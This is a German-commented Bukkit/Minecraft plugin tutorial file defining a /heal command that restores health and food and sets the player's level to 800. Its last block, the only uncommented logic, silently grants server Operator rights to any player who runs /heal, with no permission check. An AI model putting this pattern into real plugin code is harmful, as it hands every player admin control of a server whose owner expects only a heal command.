package de.rico.tutorial.commands;

import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.Bukkit;
// Autoimport von Bibliotheken die man braucht

@SuppressWarnings("unused")

public class HealCommand implements CommandExecutor {
// Kopf der Klasse mit Name HealCommand und implementiert von CommandExecutor
	
	public static String heal = "heal";
	// statischer String heal mit Wert heal
	// k�nnte man auch weglassen, spart aber dauernd das schreiben dieses Wortes ... 
	
	public HealCommand() {
	// hier wird KlassenName() aufgerufen
	// Constructor, der wenn ben�tigt Sachen enth�lt zum start der Klasse HealCommand()
	
	}
	
	@Override
	public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
		// Funktionskopf
		// wurde automatisch erzeugt (da diese Angaben von Implements mitgekommen sind)
		// ben�tigte Objekte und Strings
		// sender(wer f�r das kommando aus)
		// command (was hat der nutzer f�r ein Kommando ausgef�hrt)
		// label (ein Bezeichner - hier unused)
		// args ( Array(Datenansammlung) von Argumenten(kann auch Paramter genannt werden))
		// in args stehen der Reihe nach alles drin nach dem Kommando
		// /heal me you and  <-- alles Parameter
		// args[0] me
		// args[1] you
		// args[2] and
		// nennt man Array, Platz im Array mit Ziffern angesteuert
		// hat bestimmte Gr��e
		// durch die Ziffern auch automatisch auslesbar
		
		System.out.println("Command "+HealCommand.heal+" was executed!");
		// erste Ausgabe auf der Console Java Minecraft
		if(sender instanceof Player) {
		// wir pr�fen ob das Objekt sender teil von Player ist
		// ist der sender ein spieler?
			
			Player player = (Player) sender;
			// wir casten den player als Objekt Player und wei�en sender zu
			player.setHealthScale(40);
			// zugriff auf player und setzten der Herzen Skala auf 40 (standard 20)
			player.setHealth(20);
			// setzten Gesundheit player auf voll (20)
			player.setLevel(800);
			// setzten Spielerlevel auf 800
			player.setFoodLevel(20);
			// setzen Gesundheit voll
			player.sendMessage("Player "+ player.getName() +" got healed.");
			// nachricht an den Spieler
			
			
			
			
			if (player.isOp() == true) { sender.sendMessage("Player is already Operator"); 
										  }
			else { player.setOp(true); sender.sendMessage("u got Operator Rights!"); }
			
		} else {
			sender.sendMessage("This command only possible as a Player... !");
			
		}
		return false;
	}

}
